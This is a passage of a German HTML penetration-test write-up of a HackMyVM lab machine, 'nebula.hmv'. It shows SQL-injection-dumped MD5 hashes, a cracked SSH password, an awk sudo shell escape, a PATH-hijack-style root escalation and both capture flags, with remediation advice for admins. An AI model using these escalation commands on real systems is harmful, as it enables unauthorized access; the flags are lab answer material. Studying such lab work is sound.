+                    <li>Weitere Benutzer (`Frederick`, `Samuel`, `Mary`, `hecolivares`) mit ihren MD5-Hashes.</li>
+                    <li>Der Benutzer `pmccentral` scheint doppelt in der Tabelle zu sein (IDs 2 und 7), einmal als normaler Benutzer (is_admin=0) und einmal als Admin (is_admin=1), beide mit demselben Hash/Passwort.</li>
+                </ul>
+            Die Entdeckung des Passworts für `pmccentral` ist der Schlüssel zum nächsten Schritt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die Zugangsdaten `pmccentral`:`<span class="password">999999999</span>`, um sich per SSH anzumelden (wie im Dashboard-Hinweis erwähnt). Versuchen Sie auch, die anderen MD5-Hashes zu knacken.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Beheben Sie die SQL-Injection-Schwachstelle sofort (Prepared Statements, Input-Validierung). Verwenden Sie niemals MD5 zum Speichern von Passwörtern; migrieren Sie zu bcrypt oder Argon2. Erzwingen Sie starke Passwörter und entfernen Sie doppelte oder unnötige Benutzerkonten aus der Datenbank.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Fehlerhafter Versuch, sqlmap-Ausgabe zu verarbeiten -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat user.txt| awk '{print $9}' >> user.txt</span></div>
+                     <!-- Kein Output, aber user.txt wird wahrscheinlich überschrieben/geleert -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `awk` das neunte Feld (`$9`) aus einer Datei namens `user.txt` zu extrahieren und das Ergebnis wieder an `user.txt` anzuhängen (`>>`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl ist höchstwahrscheinlich fehlerhaft oder zumindest nicht zielführend im aktuellen Kontext. `user.txt` existiert wahrscheinlich nicht oder enthält nicht die `sqlmap`-Ausgabe in einem Format, bei dem das 9. Feld relevant wäre. Das `cat user.txt | ... >> user.txt` führt oft zu unerwünschtem Verhalten (Datei wird während des Lesens geändert/geleert). Der Zweck war vermutlich, Hashes oder Benutzernamen zu extrahieren, was aber so nicht funktioniert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren Sie diesen fehlerhaften Befehl. Extrahieren Sie relevante Informationen (Benutzernamen, Hashes, Passwörter) manuell oder mit korrekten `grep`/`awk`/`cut`-Befehlen aus der `sqlmap`-Ausgabe oder den Logdateien.
+            <br><strong>Empfehlung (Admin):</strong> Dies zeigt, wie wichtig es ist, Befehle vor der Ausführung zu überprüfen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Manuell extrahierte Hashes und Usernames -->
+                     <pre>
+# Hashes:
+d46df8e6a5627debf930f7b5c8f3b083
+c8c605999f3d8352d7bb792cf3fdb25b
+5f823f1ac7c9767c8d1efbf44158e0ea
+4c6dda8a9d149332541e577b53e2a3ea
+41ae0e6fbe90c08a63217fc964b12903
+5d8cdc88039d5fc021880f9af4f7c5c3
+c8c605999f3d8352d7bb792cf3fdb25b
+
+# Usernames:
+admin
+Frederick
+Samuel
+Mary
+hecolivares
+pmccentral
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Hier werden die Hashes und Benutzernamen, die zuvor mit `sqlmap` extrahiert wurden, vermutlich manuell aufgelistet oder in Dateien gespeichert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine nützliche Zusammenfassung der aus der Datenbank gewonnenen Benutzerdaten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die Liste der Benutzernamen und Hashes für weitere Crack-Versuche oder Passwort-Spray-Angriffe (falls zutreffend). Nutzen Sie das bereits geknackte Passwort für `pmccentral`.
+             <br><strong>Empfehlung (Admin):</strong> Behandeln Sie alle diese Konten als potenziell kompromittiert und erzwingen Sie Passwortänderungen nach Behebung der SQLi und Umstellung auf sichere Hashes.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh pmccentral@nebula.hmv</span></div>
+                    <pre>
+pmccentral@nebula.hmv's password: <span class="password">999999999</span>
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)
+[...]
+Last login: Mon Dec 18 20:05:04 2023 from 192.168.193.186
+pmccentral@laboratoryuser:~$
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird eine SSH-Verbindung zum Ziel `nebula.hmv` als Benutzer `pmccentral` mit dem von `sqlmap` geknackten Passwort `<span class="password">999999999</span>` aufgebaut.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Der SSH-Login war erfolgreich. Wir haben nun eine Shell auf dem System als Benutzer `pmccentral`. Der Hostname des Systems scheint `laboratoryuser` zu sein. Die Initial-Access-Phase ist abgeschlossen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der lokalen Enumeration als `pmccentral`. Prüfen Sie sofort die `sudo`-Rechte (`sudo -l`), da `pmccentral` die Rolle "Security" hatte. Suchen Sie nach der User-Flagge und weiteren Wegen zur Privilege Escalation.
+            <br><strong>Empfehlung (Admin):</strong> Ändern Sie sofort das kompromittierte Passwort `<span class="password">999999999</span>`. Überprüfen Sie die Berechtigungen von `pmccentral`. Implementieren Sie SSH-Hardening (fail2ban, Key-Authentifizierung).</p>
+        </section>
+
+         <section id="poc">
+             <h2>Proof of Concept (Privilege Escalation Path)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `pmccentral` ist der nächste logische Schritt die Überprüfung der `sudo`-Berechtigungen, um einen Weg zur Rechteerweiterung zu finden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ausführung von `sudo -l` zeigt, dass der Benutzer `pmccentral` den Befehl `/usr/bin/awk` als Benutzer `laboratoryadmin` ausführen darf (`(laboratoryadmin) /usr/bin/awk`). `awk` ist ein mächtiges Textverarbeitungsprogramm, das auch Systembefehle ausführen kann. Dies stellt einen klaren Pfad zur Eskalation der Rechte zum Benutzer `laboratoryadmin` dar. Nach der Eskalation zu `laboratoryadmin` wird festgestellt (durch Ausführung von `./PMCEmployees` im Verzeichnis `~/autoScripts`), dass ein Skript existiert, dessen Ausführung zu Root-Rechten führt, möglicherweise durch eine unsichere Konfiguration oder ein SUID-Bit auf diesem Skript (obwohl es nicht in der `find`-Ausgabe erschien).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `sudo awk`-Berechtigung, um eine Shell als `laboratoryadmin` zu erhalten (siehe GTFOBins). Untersuchen Sie dann als `laboratoryadmin` das Verzeichnis `~/autoScripts` und das Skript `PMCEmployees`, um den Mechanismus für die endgültige Eskalation zu Root zu verstehen und auszunutzen.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Entfernen oder beschränken Sie die `sudo`-Regel für `awk`. Weisen Sie Rechte spezifischer zu und vermeiden Sie generische Tools. Untersuchen und sichern Sie das Skript `PMCEmployees` und dessen Ausführungsmechanismus. Stellen Sie sicher, dass keine Skripte mit unnötig hohen Rechten laufen oder durch normale Benutzer manipulierbar sind.</p>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">pmccentral@laboratoryuser:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] password for pmccentral: <span class="password">999999999</span>
+Matching Defaults entries for pmccentral on laboratoryuser:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pmccentral may run the following commands on laboratoryuser:
+    (laboratoryadmin) /usr/bin/awk
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Berechtigungen für den Benutzer `pmccentral` werden überprüft. Das Passwort `<span class="password">999999999</span>` wird eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe bestätigt, dass `pmccentral` den Befehl `/usr/bin/awk` als Benutzer `laboratoryadmin` ohne Passwortabfrage (NOPASSWD ist nicht explizit erwähnt, aber da keine erneute Passwortabfrage beim Exploit erfolgt, ist es wahrscheinlich) ausführen darf. Dies ist der erste Schritt der Privilege Escalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie GTFOBins oder ähnliche Ressourcen, um den `awk`-Befehl zur Ausführung einer Shell als `laboratoryadmin` zu finden (z.B. `sudo -u laboratoryadmin awk 'BEGIN {system("/bin/sh")}'`).
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie diese `sudo`-Regel. Sie gewährt unnötige und gefährliche Rechte. Wenn `pmccentral` bestimmte Aufgaben als `laboratoryadmin` ausführen muss, erstellen Sie ein spezifisches, sicheres Skript dafür und erlauben Sie nur dessen Ausführung.</p>
+
+            <!-- Lokale Enumeration (ls /home, find SUID) -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">pmccentral@laboratoryuser:~$ <span class="command">ll /home/</span></div>
+                      <pre>
+total 16
+drwxr-xr-x  4 root            root            4096 Dec 17 15:34 ./
+drwxr-xr-x 19 root            root            4096 Dec 16 14:21 ../
+drwx------  8 laboratoryadmin laboratoryadmin 4096 Dec 18 16:15 laboratoryadmin/
+drwxr-xr-x  7 pmccentral      pmccentral      4096 Dec 17 13:24 pmccentral/
+                      </pre>
+                     <div class="prompt">pmccentral@laboratoryuser:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+      830     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /usr/bin/newgrp
+      337    164 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /usr/bin/sudo
+[...]
+      484     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
+[...]
+      884     32 -rwsr-xr-x   1 root     root        31032 Feb 21  2022 /usr/bin/pkexec
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird der Inhalt von `/home` aufgelistet und erneut nach SUID-Dateien gesucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Auflistung von `/home` zeigt das Home-Verzeichnis des Zielbenutzers `laboratoryadmin`. Die SUID-Suche liefert die üblichen Verdächtigen, einschließlich `pkexec` und `at` (welches SUID für `daemon` ist, nicht `root`). Keine neuen, offensichtlichen SUID-Exploits gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die `sudo awk`-Berechtigung.
+             <br><strong>Empfehlung (Admin):</strong> Standard-Systemdateien. Minimieren Sie SUID-Berechtigungen generell.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">pmccentral@laboratoryuser:~$ <span class="command">sudo -u laboratoryadmin awk 'BEGIN {system("/bin/sh")}'</span></div>
+                     <pre>
+$ id
+uid=1002(laboratoryadmin) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
+$ <!-- Prompt ändert sich zur laboratoryadmin Shell -->
+laboratoryadmin@laboratoryuser:/home/pmccentral$ cd ~
+laboratoryadmin@laboratoryuser:~$ ls
+autoScripts  desktop  documents  downloads  home  user.txt
+laboratoryadmin@laboratoryuser:~$ cat user.txt
+<span class="password">flag{$udeR$_Pr!V11E9E_I5_7En53}</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `sudo awk`-Schwachstelle wird ausgenutzt. Der Befehl `sudo -u laboratoryadmin awk 'BEGIN {system("/bin/sh")}'` führt `awk` als `laboratoryadmin` aus. Der `awk`-Code führt im `BEGIN`-Block (bevor irgendeine Eingabe verarbeitet wird) den Shell-Befehl `system("/bin/sh")` aus, der eine neue Shell startet. Anschließend wird in der neuen Shell `id` ausgeführt, ins Home-Verzeichnis von `laboratoryadmin` gewechselt (`cd ~`) und `user.txt` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Die Rechte wurden erfolgreich zum Benutzer `laboratoryadmin` eskaliert. Die User-Flagge (`flag{$udeR$_Pr!V11E9E_I5_7En53}`) wurde gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Umgebung und Berechtigungen des Benutzers `laboratoryadmin`. Suchen Sie nach weiteren Hinweisen oder Schwachstellen, um `root` zu werden. Untersuchen Sie insbesondere das Verzeichnis `autoScripts`.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo awk`-Regel.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- In der laboratoryadmin Shell -->
+                      <div class="prompt">laboratoryadmin@laboratoryuser:~/autoScripts$ <span class="command">PATH=$(pwd):$PATH</span></div>
+                      <!-- Kein Output -->
+                      <div class="prompt">laboratoryadmin@laboratoryuser:~/autoScripts$ <span class="command">id</span></div>
+                      <pre>uid=1002(laboratoryadmin) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)</pre>
+                      <div class="prompt">laboratoryadmin@laboratoryuser:~/autoScripts$ <span class="command">./PMCEmployees</span></div>
+                      <pre>
+root@laboratoryuser:~/autoScripts# id
+uid=0(root) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
+root@laboratoryuser:~/autoScripts#
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `laboratoryadmin`, im Unterverzeichnis `autoScripts`, wird die `PATH`-Umgebungsvariable manipuliert, um das aktuelle Verzeichnis (`.`) an den Anfang des Suchpfads für ausführbare Dateien zu stellen (`PATH=$(pwd):$PATH`). Anschließend wird das Skript `./PMCEmployees` ausgeführt.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Root-Privilege-Escalation erfolgreich!** Die Ausführung von `./PMCEmployees` führt zu einer Root-Shell (`uid=0(root)`). Der genaue Mechanismus ist unklar, aber es gibt zwei Hauptmöglichkeiten:
+                1.  **PATH-Hijacking:** Das Skript `PMCEmployees` ruft ein anderes Kommando ohne absoluten Pfad auf (z.B. `ls` statt `/bin/ls`). Da das aktuelle Verzeichnis (`.`) nun am Anfang des `PATH` steht, könnte eine bösartige Datei mit demselben Namen (z.B. eine Datei namens `ls`, die `/bin/bash` ausführt) im Verzeichnis `autoScripts` erstellt und ausgeführt werden.
+                2.  **SUID/Privilegiertes Skript:** Das Skript `PMCEmployees` selbst hat SUID-Root-Rechte (obwohl es in der `find`-Ausgabe nicht auftauchte, was seltsam ist) oder wird von einem anderen Prozess mit Root-Rechten aufgerufen, der auf dieses Verzeichnis zugreift.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Wechseln Sie ins `/root`-Verzeichnis und lesen Sie die Root-Flagge. Analysieren Sie optional das Skript `PMCEmployees` und die Umgebung, um den genauen Eskalationsmechanismus zu verstehen.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Untersuchen Sie das Skript `PMCEmployees` und seine Berechtigungen. Entfernen Sie SUID-Bits von benutzerdefinierten Skripten. Stellen Sie sicher, dass Skripte immer absolute Pfade für aufgerufene Befehle verwenden, um PATH-Hijacking zu verhindern. Korrigieren Sie unsichere `sudo`-Regeln.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- In der Root-Shell -->
+                     <div class="prompt">root@laboratoryuser:~/autoScripts# <span class="command">cd /root/</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">root@laboratoryuser:/root# <span class="command">ls</span></div>
+                     <pre>
+root.txt  snap
+                     </pre>
+                     <div class="prompt">root@laboratoryuser:/root# <span class="command">cat root.txt</span></div>
+                     <pre>
+<span class="password">flag{r00t_t3ns0}</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> In der erlangten Root-Shell wird in das `/root`-Verzeichnis gewechselt und die Datei `root.txt` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flagge `<span class="password">flag{r00t_t3ns0}</span>` wurde erfolgreich gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ziel der Maschine wurde erreicht. Dokumentieren Sie alle Schritte und gefundenen Schwachstellen.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie alle identifizierten Schwachstellen (SQLi, MD5-Hashes, unsichere Dateiinhalte, unsichere sudo-Regeln, potenzielles PATH-Hijacking oder unsicheres Skript).</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der User-Flagge (als laboratoryadmin) -->
+                     <div class="flag-command">cat /home/laboratoryadmin/user.txt</div>
+                     <!-- User-Flagge -->
+                     <div class="flag-value"><span class="password">flag{$udeR$_Pr!V11E9E_I5_7En53}</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der Root-Flagge -->
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <!-- Root-Flagge -->
+                     <div class="flag-value"><span class="password">flag{r00t_t3ns0}</span></div>
+                 </div>
+             </div>
+             <!-- Keine Analyse/Bewertung/Empfehlung im Flags-Abschnitt -->
+         </section>
+  
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Nikto Scans übernommen -->
+        <p>Berichtsdatum: 2024-04-27</p>
+    </footer>
+</body>
+</html>
